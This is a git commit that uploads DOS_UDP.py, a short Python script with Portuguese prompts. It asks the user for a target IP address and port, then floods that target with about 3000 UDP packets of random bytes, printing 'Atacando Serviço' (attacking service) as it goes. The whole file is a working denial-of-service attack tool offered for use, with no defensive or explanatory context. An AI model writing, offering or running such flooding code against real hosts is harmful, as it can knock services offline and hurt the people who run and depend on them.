852df558b862f03e081e2b2f7f1e5bb926f4b5a1
Matheus Muguet <95496099+zStartKiller@users.noreply.github.com>
2021-12-03 17:19:26 -0300

    Add files via upload

---
+++ DOS_UDP.py
@@ -0,0 +1,34 @@
+import socket
+import os
+from platform import platform, system
+import random
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+def dos_udp():
+	ip = str(input("Alvo: "))
+	port = int(input("Porta: "))
+	
+	packages = random._urandom(4092)
+	contagem = 0
+
+	while contagem <= 3000: 
+		try: 
+			s.sendto(packages, ((ip, port)))
+			iphost = socket.gethostbyname(ip)
+			print(f"Atacando Serviço => {iphost}")
+			contagem += 1
+
+		except Exception as error:
+			print(f"Um erro ocorreu enquanto o programa estava rodando: {error}")
+
+
+
+def main():
+	while True:
+		dos_udp()
+		break
+
+
+
+main()
